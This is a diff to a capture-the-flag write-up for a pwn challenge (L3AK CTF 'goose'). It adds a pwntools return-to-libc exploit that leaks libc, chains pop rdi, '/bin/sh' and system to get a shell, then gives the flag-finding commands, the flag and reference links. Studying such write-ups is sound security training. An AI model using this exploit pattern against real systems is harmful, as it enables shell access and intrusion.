@@ -215,10 +215,36 @@ payload += p64(shellcode_address)
 # payload += p64(stack_leak-0x150)
 ```
 
-## 3.5 FULL SCRIPT
-![[./attachments/c2 2.py]]
+3.5 ROP
+IF CHOOSE ROP
+```python
+libc_leak = int(ru(b" ", True), 16) - 0x93975
+log.success(f"Libc leak: {libc_leak:#x}")
+libc.address = libc_leak
+
+pop_rdi = libc_leak + 0x10f75b
+ret     = libc_leak + 0x10f75c
+binsh   = next(libc.search(b"/bin/sh\0"))
+
+payload = flat(
+    b"A" * 0x178,
+    pop_rdi,
+    binsh,
+    ret,
+    libc.sym.system
+)
+sa(b"world?", payload)
+```
+
 # 4.0 FLAG 
 find / -name * flag*
 cat /flag
 
 L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}
+
+# 5.0 FULL SCRIPT
+![[./attachments/c2 2.py]]
+
+## 6.0 REFERENCE 
+https://mindcrafters.xyz/writeups/leak-pwn/
+https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/#the-goose
